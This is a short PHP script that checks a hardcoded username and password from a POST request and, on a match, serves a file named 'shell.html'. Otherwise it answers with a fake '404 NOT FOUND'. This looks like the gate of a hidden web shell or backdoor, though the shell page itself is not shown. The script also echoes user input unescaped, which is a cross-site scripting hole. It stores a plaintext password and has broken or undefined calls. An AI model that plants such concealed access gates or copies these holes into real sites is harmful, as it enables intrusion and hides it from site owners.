<?php
//$loginfile = fopen("logins","rb");
//$logins=fread($loginfile,filesize("logins"));
//$logins=decompress("gzip",$logins);
echo $_POST["USER"]."\n";
if($_POST["username"]=="bxgfrr"&&$_POST["password"]=="Angel4kevin"){
	$shellfile = fopen("shell.html","rb");
	echo(fread($shellfile,filesize($shellfile)));
	echo $fos;
}else{
	echo "404 NOT FOUND\n";
}

?>